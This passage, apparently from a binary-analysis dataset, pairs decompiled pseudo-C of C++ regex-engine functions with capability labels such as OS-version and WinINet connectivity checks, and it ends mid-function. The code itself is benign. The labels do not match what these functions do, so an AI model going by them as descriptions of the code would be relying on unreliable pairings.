        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_28h\n\nvoid fcn.180033010(int64_t *arg1, ulong arg2, ulong arg3, ulong noname_3, ulong noname_4, ulong noname_5, ulong noname_6\n                  , ulong noname_7, ulong noname_8, ulong noname_9, ulong noname_10, ulong noname_11, ulong noname_12, \n                  ulong noname_13, ulong noname_14, ulong noname_15, ulong noname_16, ulong noname_17, ulong noname_18, \n                  ulong arg_38h)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    uchar (*pauVar3) [16];\n    uchar (*pauVar4) [16];\n    uchar (*pauVar5) [16];\n    uchar (*pauVar6) [16];\n    uchar (*pauVar7) [16];\n    int64_t iVar8;\n    int64_t iVar9;\n    ulong var_20h;\n    ulong var_28h;\n    ulong var_30h;\n    \n    iVar9 = arg1[1];\n    if ((*(iVar9 + 8) == 6) && (*(iVar9 + 0x24) != 1)) {\n        *(iVar9 + 0x24) = *(iVar9 + 0x24) + -1;\n        fcn.1800315f0(arg1);\n        iVar9 = arg1[1];\n    }\n    if ((*(iVar9 + 8) == 9) || (*(iVar9 + 8) == 0xe)) {\n        iVar9 = *(iVar9 + 0x20);\n    }\n    if ((arg2 == 0) && (arg3 == 1)) {\n        pauVar3 = fcn.18008fb2c(0x20);\n        *pauVar3 = ZEXT816(0);\n        pauVar3[1] = ZEXT816(0);\n        *(*pauVar3 + 8) = 0x11;\n        *pauVar3[1] = 0;\n        *(pauVar3[1] + 8) = 0;\n        **pauVar3 = vtable.std::_Node_endif.0;\n        pauVar4 = fcn.18008fb2c(0x30);\n        *pauVar4 = ZEXT816(0);\n        pauVar4[1] = ZEXT816(0);\n        pauVar4[2] = ZEXT816(0);\n        *(*pauVar4 + 8) = 0x10;\n        *pauVar4[1] = 0;\n        *(pauVar4[1] + 8) = 0;\n        **pauVar4 = vtable.std::_Node_if.0;\n        *pauVar4[2] = pauVar3;\n        *(pauVar4[2] + 8) = 0;\n        pauVar5 = fcn.18008fb2c(0x30);\n        *pauVar5 = ZEXT816(0);\n        pauVar5[1] = ZEXT816(0);\n        pauVar5[2] = ZEXT816(0);\n        *(*pauVar5 + 8) = 0x10;\n        *pauVar5[1] = 0;\n        *(pauVar5[1] + 8) = 0;\n        **pauVar5 = vtable.std::_Node_if.0;\n        *pauVar5[2] = pauVar3;\n        *(pauVar5[2] + 8) = 0;\n        pauVar6 = fcn.18008fb2c(0x20);\n        *pauVar6 = ZEXT816(0);\n        pauVar6[1] = ZEXT816(0);\n        *(*pauVar6 + 8) = 8;\n        **pauVar6 = vtable.std::_Node_base.0;\n        *pauVar6[1] = 0;\n        *(pauVar6[1] + 8) = 0;\n        pauVar7 = fcn.18008fb2c(0x28);\n        *pauVar7 = ZEXT816(0);\n        pauVar7[1] = ZEXT816(0);\n        *(*pauVar7 + 8) = 9;\n        **pauVar7 = vtable.std::_Node_end_group.0;\n        *pauVar7[2] = pauVar6;\n        *pauVar5[1] = pauVar6;\n        *(pauVar6[1] + 8) = pauVar5;\n        *pauVar6[1] = pauVar7;\n        *(pauVar7[1] + 8) = pauVar6;\n        *pauVar7[1] = pauVar3;\n        *(pauVar4[2] + 8) = pauVar5;\n        *(pauVar3[1] + 8) = arg1[1];\n        iVar8 = arg1[1];\n        if (*(iVar8 + 0x10) != 0) {\n            *pauVar3[1] = *(iVar8 + 0x10);\n            *(*(arg1[1] + 0x10) + 0x18) = pauVar3;\n            iVar8 = arg1[1];\n        }\n        *(iVar8 + 0x10) = pauVar3;\n        arg1[1] = pauVar3;\n        *(*(iVar9 + 0x18) + 0x10) = pauVar4;\n        *(pauVar4[1] + 8) = *(iVar9 + 0x18);\n        *(iVar9 + 0x18) = pauVar4;\n        *pauVar4[1] = iVar9;\n        if (noname_3 == 0) {\n            iVar8 = *pauVar5[1];\n            uVar2 = *(iVar9 + 0x18);\n            *(iVar9 + 0x18) = *(iVar8 + 0x18);\n            *(iVar8 + 0x18) = uVar2;\n            uVar2 = *pauVar4[1];\n            *pauVar4[1] = *pauVar5[1];\n            *pauVar5[1] = uVar2;\n        }\n    }\n    else {\n        pauVar3 = fcn.18008fb2c(0x28);\n        *pauVar3 = ZEXT816(0);\n        pauVar3[1] = ZEXT816(0);\n        *(*pauVar3 + 8) = 0x13;\n        *pauVar3[1] = 0;\n        *(pauVar3[1] + 8) = 0;\n        **pauVar3 = vtable.std::_Node_end_rep.0;\n        *pauVar3[2] = 0;\n        pauVar4 = fcn.18008fb2c(0x38);\n        *pauVar4 = ZEXT816(0);\n        pauVar4[1] = ZEXT816(0);\n        pauVar4[2] = ZEXT816(0);\n        *pauVar4[3] = 0;\n        iVar1 = *(*arg1 + 0x24);\n        *(*arg1 + 0x24) = iVar1 + 1;\n        *(*pauVar4 + 0xc) = noname_3 * 2;\n        **pauVar4 = vtable.std::_Node_rep.0;\n        *(*pauVar4 + 8) = 0x12;\n        *pauVar4[1] = 0;\n        *(pauVar4[1] + 8) = 0;\n        *pauVar4[2] = arg2;\n        *(pauVar4[2] + 4) = arg3;\n        *(pauVar4[2] + 8) = pauVar3;\n        *pauVar4[3] = iVar1;\n        *(pauVar4[3] + 4) = 0xffffffff;\n        *pauVar3[2] = pauVar4;\n        *(pauVar3[1] + 8) = arg1[1];\n        iVar8 = arg1[1];\n        if (*(iVar8 + 0x10) != 0) {\n            *pauVar3[1] = *(iVar8 + 0x10);\n            *(*(arg1[1] + 0x10) + 0x18) = pauVar3;\n            iVar8 = arg1[1];\n        }\n        *(iVar8 + 0x10) = pauVar3;\n        arg1[1] = pauVar3;\n        *(*(iVar9 + 0x18) + 0x10) = pauVar4;\n        *(pauVar4[1] + 8) = *(iVar9 + 0x18);\n        *(iVar9 + 0x18) = pauVar4;\n        *pauVar4[1] = iVar9;\n    }\n    return;\n}\n",
        "token_count": 2042
    },
    "18003335": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.180033350(char **arg1, int64_t arg2)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    uint8_t uVar3;\n    char cVar4;\n    int32_t iVar5;\n    int64_t iVar6;\n    char *pcVar7;\n    int32_t iVar8;\n    int64_t iVar9;\n    int64_t iVar10;\n    bool bVar11;\n    uchar auStack184 [32];\n    char *pcStack152;\n    uint uStack144;\n    char cStack136;\n    char *pcStack128;\n    ulong uStack120;\n    char *pcStack112;\n    int64_t iStack104;\n    int64_t iStack96;\n    int64_t iStack88;\n    char *pcStack80;\n    uint64_t uStack72;\n    \n    uStack120 = 0xfffffffffffffffe;\n    uStack72 = *0x180123080 ^ auStack184;\n    iVar8 = *(arg1 + 0x1c);\n    if (0 < iVar8) {\n        iVar8 = iVar8 + -1;\n        *(arg1 + 0x1c) = iVar8;\n        if (iVar8 < 1) {\n            fcn.18006dfac(0xc);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n    }\n    if ((0 < *(arg1 + 0xdc)) && (iVar5 = *(arg1 + 0xdc) + -1,  *(arg1 + 0xdc) = iVar5,  iVar5 < 1)) {\n        fcn.18006dfac(0xb);\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    bVar11 = false;\n    if (arg2 != 0) {\n        do {\n            iVar8 = *(arg2 + 8);\n            if (0x14 < iVar8 - 1U) {\n                fcn.18006dfac(0xd);\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n    // switch table (21 cases) at 0x1800338a0\n            switch(iVar8) {\n            case 2:\n                if (((*(arg1 + 0xbc) >> 8 & 1) == 0) && (*arg1 == arg1[0x13])) {\n                    bVar11 = *(arg1 + 0xbc) & 1;\n                }\n                else {\n                    bVar11 = (*arg1)[-1] != '\\n';\n                }\n                break;\n            case 3:\n                if (*arg1 == arg1[0x14]) {\n                    bVar11 = *(arg1 + 0xbc) >> 1 & 1;\n                }\n                else {\n                    bVar11 = **arg1 != '\\n';\n                }\n                break;\n            case 4:\n                uVar3 = fcn.180034920(arg1);\n                bVar11 = uVar3 == (*(arg2 + 0xc) & 1);\n                break;\n            case 5:\n                pcVar7 = *arg1;\n                if (((pcVar7 == arg1[0x14]) || (*pcVar7 == '\\n')) || (*pcVar7 == '\\r')) goto code_r0x000180033835;\n                *arg1 = pcVar7 + 1;\n                break;\n            case 6:\n                uStack144 = *(arg1 + 0x17);\n                pcStack152 = arg1[0x1a];\n                pcVar7 = fcn.180033900(*arg1, arg1[0x14], *(arg2 + 0x28), *(arg2 + 0x24) + *(arg2 + 0x28));\n                if (pcVar7 == *arg1) goto code_r0x000180033835;\n                *arg1 = pcVar7;\n                break;\n            case 7:\n                if ((*arg1 != arg1[0x14]) && (cVar4 = fcn.1800346a0(arg1, arg2),  cVar4 != '\\0')) {\n                    bVar11 = false;\n                    goto code_r0x00018003361d;\n                }\n                goto code_r0x000180033835;\n            case 10:\n            case 0xb:\n                pcVar7 = *arg1;\n                cStack136 = iVar8 == 0xb;\n                pcStack80 = NULL;\n                iStack104 = 0;\n                iStack96 = 0;\n                iVar9 = 0;\n                iStack88 = 0;\n                pcStack128 = arg1[1];\n                pcStack112 = pcVar7;\n                if (pcStack128 == arg1[2]) {\n                    iVar6 = 0;\n                }\n                else {\n                    iVar10 = arg1[2] - pcStack128;\n                    iVar6 = fcn.180015a30(*((iVar8 - 1U) * 4 + 0x1800338a0) + 0x180000000, iVar10 >> 2);\n                    iVar9 = iVar6 + (iVar10 >> 2) * 4;\n                    iStack104 = iVar6;\n                    iStack88 = iVar9;\n                    fcn.1800ade80(iVar6, pcStack128, iVar10);\n                    iStack96 = iVar6 + iVar10;\n                }\n                pcStack80 = arg1[4];\n                cVar4 = fcn.180033350(arg1, *(arg2 + 0x20));\n                *arg1 = pcVar7;\n                if (cVar4 == cStack136) {\n                    fcn.180019f70(arg1 + 1, &iStack104);\n                    bVar11 = true;\n                    iVar9 = iStack88;\n                    iVar6 = iStack104;\n                }\n                if (iVar6 != 0) {\n                    iVar10 = iVar6;\n                    if ((0xfff < (iVar9 - iVar6 & 0xfffffffffffffffcU)) &&\n                       (iVar10 = *(iVar6 + -8),  0x1f < (iVar6 - iVar10) - 8U)) {\n                        fcn.1800b3528();\n                        pcVar2 = swi(3);\n                        (*pcVar2)();\n                        return;\n                    }\n                    fcn.18008fb24(iVar10);\n                    iStack104 = 0;\n                    iStack96 = 0;\n                    iStack88 = 0;\n                }\n                break;\n            case 0xc:\n                goto code_r0x00018003375e;\n            case 0xd:\n                *(arg1[5] + *(arg2 + 0x20) * 0x10) = *arg1;\n                pcVar7 = arg1[4];\n                if (*(arg2 + 0x20) < pcVar7) {\n                    do {\n                        pcVar7 = pcVar7 + -1;\n                        *(arg1[1] + (pcVar7 >> 5) * 4) = *(arg1[1] + (pcVar7 >> 5) * 4) & ~(1 << (pcVar7 & 0x1f));\n                    } while (*(arg2 + 0x20) < pcVar7);\n                }\n                break;\n            case 0xe:\n                iVar9 = *(arg2 + 0x20);\n                if ((*(arg1 + 0xc1) != '\\0') || (*(iVar9 + 0x20) != 0)) {\n                    *(arg1[1] + (*(iVar9 + 0x20) >> 5) * 4) =\n                         *(arg1[1] + (*(iVar9 + 0x20) >> 5) * 4) | 1 << (*(iVar9 + 0x20) & 0x1f);\n                    *(arg1[5] + *(iVar9 + 0x20) * 0x10 + 8) = *arg1;\n                }\n                break;\n            case 0xf:\n                uVar1 = *(arg2 + 0x20);\n                if ((*(arg1[1] + (uVar1 >> 5) * 4) >> (uVar1 & 0x1f) & 1) != 0) {\n                    pcVar7 = *arg1;\n                    iVar9 = *(arg1[5] + uVar1 * 0x10);\n                    iVar6 = *(arg1[5] + uVar1 * 0x10 + 8);\n                    if (iVar9 != iVar6) {\n                        uStack144 = *(arg1 + 0x17);\n                        pcStack152 = arg1[0x1a];\n                        pcVar7 = fcn.180033900(pcVar7, arg1[0x14], iVar9, iVar6);\n                        if (pcVar7 == *arg1) goto code_r0x000180033835;\n                    }\n                    *arg1 = pcVar7;\n                }\n                break;\n            case 0x10:\n                cVar4 = fcn.180034170(arg1, arg2);\n                if (cVar4 == '\\0') {\n                    bVar11 = true;\n                }\ncode_r0x00018003375e:\n                arg2 = 0;\n                break;\n            case 0x12:\n                cVar4 = fcn.180034480(arg1, arg2, \n                                      (*(arg2 + 0xc) >> 1 & 0xff | (*(arg2 + 0xc) >> 9) << 8) & 0xffffffffffffff01, 0);\n                if (cVar4 == '\\0') {\n                    bVar11 = true;\n                }\n                arg2 = 0;\n                break;\n            case 0x13:\n                iVar9 = *(arg2 + 0x20);\n                if (*(iVar9 + 0x34) != 0) goto code_r0x00018003375e;\n                cVar4 = fcn.180034480(arg1, iVar9, \n                                      (*(iVar9 + 0xc) >> 1 & 0xff | (*(iVar9 + 0xc) >> 9) << 8) & 0xffffffffffffff01, \n                                      *(arg1[0x10] + *(iVar9 + 0x30) * 0x10));\n                if (cVar4 == '\\0') {\n                    bVar11 = true;\n                }\n                arg2 = 0;\n                break;\n            case 0x15:\n                if ((((*(arg1 + 0xbc) & 0x2020) == 0) || (arg1[0x13] != *arg1)) &&\n                   ((*(arg1 + 0x1b) == '\\0' || (*arg1 == arg1[0x14])))) {\n                    if ((*(arg1 + 0x18) == '\\0') || (cVar4 = fcn.180034850(arg1),  cVar4 != '\\0')) {\n                        fcn.180019e40(arg1 + 8, arg1);\n                        *(arg1 + 0x18) = 1;\n                    }\n                    arg2 = 0;\n                }\n                else {\n                    bVar11 = true;\n                    arg2 = 0;\n                }\n            }\n            if (bVar11 != false) goto code_r0x000180033835;\ncode_r0x00018003361d:\n            if ((arg2 == 0) || (arg2 = *(arg2 + 0x10),  arg2 == 0)) goto code_r0x000180033835;\n        } while( true );\n    }\ncode_r0x00018003383b:\n    if (0 < iVar8) {\n        *(arg1 + 0x1c) = iVar8 + 1;\n    }\n    fcn.18008fb00(uStack72 ^ auStack184);\n    return;\ncode_r0x000180033835:\n    iVar8 = *(arg1 + 0x1c);\n    goto code_r0x00018003383b;\n}\n",
        "token_count": 2639
    },
    "180033a2": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.180033a20(char **arg1, ulong arg2)\n\n{\n    char *pcVar1;\n    char cVar2;\n    code *pcVar3;\n    char *pcVar4;\n    char **noname_0;\n    int32_t iVar5;\n    \n    *(arg1 + 0x74) = 0;\n    noname_0 = arg1;\n    if (arg2 != 0) {\n        do {\n            cVar2 = *(arg1 + 0xf);\n            iVar5 = cVar2;\n            if (cVar2 - 0x30U < 10) {\n                iVar5 = iVar5 + -0x30;\n            }\n            else if (cVar2 + 0x9fU < 6) {\n                iVar5 = iVar5 + -0x57;\n            }\n            else {\n                if (5 < cVar2 + 0xbfU) goto code_r0x000180033ae3;\n                iVar5 = iVar5 + -0x37;\n            }\n            if (iVar5 == -1) {\ncode_r0x000180033ae3:\n                if (arg2 == 0) {\n                    return;\n                }\n                fcn.180015140(noname_0, 2);\n                pcVar3 = swi(3);\n                (*pcVar3)();\n                return;\n            }\n            arg2._0_4_ = arg2 + -1;\n            *(arg1 + 0x74) = *(arg1 + 0x74) * 0x10 + iVar5;\n            pcVar4 = *arg1;\n            if (pcVar4 != arg1[2]) {\n                if (((*pcVar4 == '\\\\') && (pcVar1 = pcVar4 + 1,  pcVar1 != arg1[2])) &&\n                   ((((*(arg1 + 0x10) & 8) == 0 && (*pcVar1 - 0x28U < 2)) ||\n                    (((*(arg1 + 0x10) & 0x10) == 0 && ((*pcVar1 + 0x85U & 0xfd) == 0)))))) {\n                    pcVar4 = pcVar1;\n                }\n                *arg1 = pcVar4 + 1;\n            }\n            noname_0 = arg1;\n            fcn.180030080(arg1);\n        } while (arg2 != 0);\n    }\n    return;\n}\n",
        "token_count": 532
    },
    "180033b0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint64_t fcn.180033b00(char **arg1)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    code *pcVar4;\n    char cVar5;\n    uint64_t uVar6;\n    char **noname_0;\n    char *pcVar7;\n    \n    iVar2 = *(arg1 + 0x7c);\n    if (iVar2 != 0x5c) {\n        if (iVar2 == 0x5b) {\n            pcVar7 = *arg1;\n            if (pcVar7 != arg1[2]) {\n                if (((*pcVar7 == '\\\\') && (pcVar1 = pcVar7 + 1,  pcVar1 != arg1[2])) &&\n                   ((((*(arg1 + 0x10) & 8) == 0 && (*pcVar1 - 0x28U < 2)) ||\n                    (((*(arg1 + 0x10) & 0x10) == 0 && ((*pcVar1 + 0x85U & 0xfd) == 0)))))) {\n                    pcVar7 = pcVar1;\n                }\n                *arg1 = pcVar7 + 1;\n            }\n            fcn.180030080(arg1);\n            uVar3 = *(arg1 + 0x7c);\n            if ((uVar3 < 0x3e) && ((0x2400400000000000U >> (uVar3 & 0x3fU) & 1) != 0)) {\n                pcVar7 = *arg1;\n                if (pcVar7 != arg1[2]) {\n                    if (((*pcVar7 == '\\\\') && (pcVar1 = pcVar7 + 1,  pcVar1 != arg1[2])) &&\n                       ((((*(arg1 + 0x10) & 8) == 0 && (*pcVar1 - 0x28U < 2)) ||\n                        (((*(arg1 + 0x10) & 0x10) == 0 && ((*pcVar1 + 0x85U & 0xfd) == 0)))))) {\n                        pcVar7 = pcVar1;\n                    }\n                    *arg1 = pcVar7 + 1;\n                }\n                fcn.180030080(arg1);\n                fcn.180034b50(arg1, uVar3 & 0xffffffff);\n                return 2;\n            }\n            *(arg1 + 0x74) = 0x5b;\n            return 1;\n        }\n        if ((iVar2 == 0x5d) || (iVar2 == -1)) {\n            return 0;\n        }\n        *(arg1 + 0x74) = *(arg1 + 0xf);\n        pcVar7 = *arg1;\n        goto code_r0x000180033df0;\n    }\n    pcVar7 = *arg1;\n    if (pcVar7 != arg1[2]) {\n        if (((*pcVar7 == '\\\\') && (pcVar1 = pcVar7 + 1,  pcVar1 != arg1[2])) &&\n           ((((*(arg1 + 0x10) & 8) == 0 && (*pcVar1 - 0x28U < 2)) ||\n            (((*(arg1 + 0x10) & 0x10) == 0 && ((*pcVar1 + 0x85U & 0xfd) == 0)))))) {\n            pcVar7 = pcVar1;\n        }\n        *arg1 = pcVar7 + 1;\n    }\n    fcn.180030080(arg1);\n    uVar3 = *(arg1 + 0x10);\n    if ((uVar3 >> 0x15 & 1) != 0) {\n        if (((uVar3 >> 0xe & 1) == 0) || (*(arg1 + 0xf) != '\\\\')) {\n            if (((uVar3 >> 0x11 & 1) != 0) && (cVar5 = fcn.180032610(arg1),  cVar5 != '\\0')) {\n                return 2;\n            }\n            noname_0 = arg1;\n            cVar5 = fcn.180032560(arg1);\n            if (cVar5 == '\\0') {\n                cVar5 = fcn.1800329a0(arg1);\n                return cVar5 != '\\0';\n            }\n            if (*(arg1 + 0x74) != 0) {\n                fcn.180015140(noname_0, 2);\n                pcVar4 = swi(3);\n                uVar6 = (*pcVar4)();\n                return uVar6;\n            }\n        }\n        else {\n            pcVar7 = *arg1;\n            *(arg1 + 0x74) = 0x5c;\n            if (pcVar7 != arg1[2]) {\n                if (((*pcVar7 == '\\\\') && (pcVar1 = pcVar7 + 1,  pcVar1 != arg1[2])) &&\n                   ((((uVar3 & 8) == 0 && (*pcVar1 - 0x28U < 2)) ||\n                    (((uVar3 & 0x10) == 0 && ((*pcVar1 + 0x85U & 0xfd) == 0)))))) {\n                    pcVar7 = pcVar1;\n                }\n                *arg1 = pcVar7 + 1;\n            }\n            fcn.180030080(arg1);\n        }\n        return 1;\n    }\n    if ((uVar3 >> 0x10 & 1) != 0) {\n        cVar5 = *(arg1 + 0xf);\n        if (cVar5 == 'f') {\n            *(arg1 + 0x74) = 0xc;\n            pcVar7 = *arg1;\n            goto code_r0x000180033df0;\n        }\n        if (cVar5 == 'n') {\n            *(arg1 + 0x74) = 10;\n            pcVar7 = *arg1;\n            goto code_r0x000180033df0;\n        }\n        if (cVar5 == 'r') {\n            *(arg1 + 0x74) = 0xd;\n            pcVar7 = *arg1;\n            goto code_r0x000180033df0;\n        }\n        if (cVar5 == 't') {\n            *(arg1 + 0x74) = 9;\n            pcVar7 = *arg1;\n            goto code_r0x000180033df0;\n        }\n        if (cVar5 == 'v') {\n            *(arg1 + 0x74) = 0xb;\n            pcVar7 = *arg1;\n            goto code_r0x000180033df0;\n        }\n    }\n    if ((uVar3 >> 0xf & 1) == 0) {\ncode_r0x000180033cd0:\n        *(arg1 + 0x74) = 0x5c;\n        return 1;\n    }\n    if (*(arg1 + 0xf) == 'a') {\n        *(arg1 + 0x74) = 7;\n        pcVar7 = *arg1;\n    }\n    else {\n        if (*(arg1 + 0xf) != 'b') goto code_r0x000180033cd0;\n        *(arg1 + 0x74) = 8;\n        pcVar7 = *arg1;\n    }\ncode_r0x000180033df0:\n    if (pcVar7 != arg1[2]) {\n        if (((*pcVar7 == '\\\\') && (pcVar1 = pcVar7 + 1,  pcVar1 != arg1[2])) &&\n           ((((*(arg1 + 0x10) & 8) == 0 && (*pcVar1 - 0x28U < 2)) ||\n            (((*(arg1 + 0x10) & 0x10) == 0 && ((*pcVar1 + 0x85U & 0xfd) == 0)))))) {\n            pcVar7 = pcVar1;\n        }\n        *arg1 = pcVar7 + 1;\n    }\n    fcn.180030080(arg1);\n    return 1;\n}\n",
        "token_count": 1817
    },
    "18003417": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180034170(int64_t *arg1, int64_t arg2)\n\n{\n    code *pcVar1;\n    char cVar2;\n    uchar *puVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    uchar auStack232 [32];\n    ulong uStack200;\n    uchar auStack184 [16];\n    uchar auStack168 [16];\n    uchar auStack152 [16];\n    uchar auStack136 [16];\n    uchar auStack120 [16];\n    uchar auStack104 [16];\n    uchar auStack88 [16];\n    uchar auStack72 [16];\n    uint64_t uStack56;\n    \n    uStack200 = 0xfffffffffffffffe;\n    uStack56 = *0x180123080 ^ auStack232;\n    auStack184 = ZEXT816(0);\n    auStack168 = ZEXT816(0);\n    auStack152 = ZEXT816(0);\n    auStack136 = ZEXT816(0);\n    puVar3 = auStack184;\n    fcn.180019da0(puVar3, arg1);\n    auStack152._8_8_ = 0;\n    auStack152 = auStack152 & 0xffffffffffffffff;\n    auStack136 = ZEXT816(0);\n    iVar4 = arg1[5];\n    if (iVar4 != arg1[6]) {\n        iVar6 = arg1[6] - iVar4;\n        auStack152._8_8_ = fcn.18001b980(puVar3, iVar6 >> 4);\n        auStack136._8_8_ = (iVar6 >> 4) * 0x10 + auStack152._8_8_;\n        fcn.1800ade80(auStack152._8_8_, iVar4, iVar6);\n        auStack136 = CONCAT88(auStack136._8_8_, iVar6 + auStack152._8_8_);\n    }\n    if (arg2 != 0) {\ncode_r0x000180034224:\n        fcn.180019e40(arg1, auStack184);\n        cVar2 = fcn.180033350(arg1, *(arg2 + 0x10));\n        if (cVar2 == '\\0') goto code_r0x000180034244;\n        if (*(arg1 + 0x19) != '\\0') {\n            auStack120 = ZEXT816(0);\n            auStack104 = ZEXT816(0);\n            auStack88 = ZEXT816(0);\n            auStack72 = ZEXT816(0);\n            puVar3 = auStack120;\n            fcn.180019da0(puVar3, arg1);\n            auStack88 = auStack88 & 0xffffffffffffffff;\n            auStack72 = ZEXT816(0);\n            iVar4 = arg1[5];\n            if (iVar4 != arg1[6]) {\n                iVar7 = arg1[6] - iVar4;\n                iVar6 = fcn.18001b980(puVar3, iVar7 >> 4);\n                auStack88 = CONCAT88(iVar6, auStack88._0_8_);\n                auStack72._8_8_ = (iVar7 >> 4) * 0x10 + iVar6;\n                fcn.1800ade80(iVar6, iVar4, iVar7);\n                auStack72 = CONCAT88(auStack72._8_8_, iVar7 + iVar6);\n            }\n            iVar6 = *arg1 - auStack184._0_8_;\n            for (iVar4 = *(arg2 + 0x28); iVar4 != 0; iVar4 = *(iVar4 + 0x28)) {\n                fcn.180019e40(arg1, auStack184);\n                cVar2 = fcn.180033350(arg1, *(iVar4 + 0x10));\n                if (cVar2 != '\\0') {\n                    iVar7 = *arg1;\n                    if (iVar6 < iVar7 - auStack184._0_8_) {\n                        fcn.180019e40(auStack120, arg1);\n                        iVar6 = iVar7 - auStack184._0_8_;\n                    }\n                }\n            }\n            fcn.180019e40(arg1, auStack120);\n            if (auStack88._8_8_ != 0) {\n                uVar5 = auStack72._8_8_ - auStack88._8_8_ & 0xfffffffffffffff0;\n                iVar4 = auStack88._8_8_;\n                if ((uVar5 < 0x1000) || (iVar4 = *(auStack88._8_8_ + -8),  (auStack88._8_8_ - iVar4) - 8U < 0x20)) {\n                    fcn.18008fb24(iVar4);\n                    goto code_r0x00018003441c;\n                }\ncode_r0x000180034467:\n                fcn.1800b3528(iVar4, uVar5 + 0x27);\n                goto code_r0x00018003446d;\n            }\ncode_r0x00018003441c:\n            if (auStack120._8_8_ != 0) {\n                uVar5 = (auStack104._8_8_ - auStack120._8_8_ >> 2) * 4;\n                iVar4 = auStack120._8_8_;\n                if ((0xfff < uVar5) && (iVar4 = *(auStack120._8_8_ + -8),  0x1f < (auStack120._8_8_ - iVar4) - 8U))\n                goto code_r0x000180034467;\n                fcn.18008fb24(iVar4);\n            }\n        }\n    }\ncode_r0x000180034253:\n    if (auStack152._8_8_ != 0) {\n        iVar4 = auStack152._8_8_;\n        if ((0xfff < (auStack136._8_8_ - auStack152._8_8_ & 0xfffffffffffffff0U)) &&\n           (iVar4 = *(auStack152._8_8_ + -8),  0x1f < (auStack152._8_8_ - iVar4) - 8U)) goto code_r0x00018003446d;\n        fcn.18008fb24(iVar4);\n    }\n    if (auStack184._8_8_ != 0) {\n        iVar4 = auStack184._8_8_;\n        if ((0xfff < (auStack168._8_8_ - auStack184._8_8_ & 0xfffffffffffffffcU)) &&\n           (iVar4 = *(auStack184._8_8_ + -8),  0x1f < (auStack184._8_8_ - iVar4) - 8U)) {\ncode_r0x00018003446d:\n            fcn.1800b3528();\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        fcn.18008fb24(iVar4);\n    }\n    fcn.18008fb00(uStack56 ^ auStack232);\n    return;\ncode_r0x000180034244:\n    arg2 = *(arg2 + 0x28);\n    if (arg2 == 0) goto code_r0x000180034253;\n    goto code_r0x000180034224;\n}\n",
        "token_count": 1659
    },
    "18003448": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180034480(int64_t *arg1, int64_t arg2, ulong noname_2, ulong arg4)\n\n{\n    int32_t iVar1;\n    int64_t arg2_00;\n    int64_t *piVar2;\n    bool bVar3;\n    char cVar4;\n    int64_t arg1_00;\n    uchar *arg1_01;\n    ulong arg2_01;\n    int32_t *piVar5;\n    int64_t arg3;\n    uchar auStack200 [32];\n    char cStack168;\n    ulong uStack160;\n    int64_t aiStack152 [2];\n    uchar auStack136 [16];\n    uchar auStack120 [16];\n    uchar auStack104 [16];\n    uchar auStack88 [16];\n    uint64_t uStack72;\n    \n    uStack160 = 0xfffffffffffffffe;\n    uStack72 = *0x180123080 ^ auStack200;\n    cStack168 = noname_2;\n    if (*(arg2 + 0x34) == 1) {\n        fcn.180034d90(arg1, arg2);\n        goto code_r0x00018003466b;\n    }\n    auStack136 = ZEXT816(0);\n    auStack120 = ZEXT816(0);\n    auStack104 = ZEXT816(0);\n    auStack88 = ZEXT816(0);\n    arg1_01 = auStack136;\n    fcn.180019da0(arg1_01, arg1);\n    auStack104 = auStack104 & 0xffffffffffffffff;\n    auStack88 = ZEXT816(0);\n    arg2_00 = arg1[5];\n    if (arg2_00 != arg1[6]) {\n        arg3 = arg1[6] - arg2_00;\n        arg1_00 = fcn.18001b980(arg1_01, arg3 >> 4);\n        auStack104 = CONCAT88(arg1_00, auStack104._0_8_);\n        auStack88._8_8_ = (arg3 >> 4) * 0x10 + arg1_00;\n        fcn.1800ade80(arg1_00, arg2_00, arg3);\n        auStack88 = CONCAT88(auStack88._8_8_, arg3 + arg1_00);\n    }\n    piVar5 = *(arg2 + 0x30) * 0x10 + arg1[0x10];\n    iVar1 = *piVar5;\n    piVar2 = *(piVar5 + 2);\n    aiStack152[0] = *arg1;\n    if ((arg4 == 0) || (*piVar2 != aiStack152[0])) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((*(arg2 + 0x24) < 0) || (arg4 < *(arg2 + 0x24))) {\n        if (arg4 < *(arg2 + 0x20)) {\n            if (!bVar3) goto code_r0x000180034631;\ncode_r0x0001800345db:\n            *piVar5 = arg4 + 1;\n            *(piVar5 + 2) = aiStack152;\n            arg2_01 = *(arg2 + 0x10);\n            goto code_r0x000180034639;\n        }\n        if (cStack168 != '\\0') {\n            if (bVar3) {\n                *piVar5 = 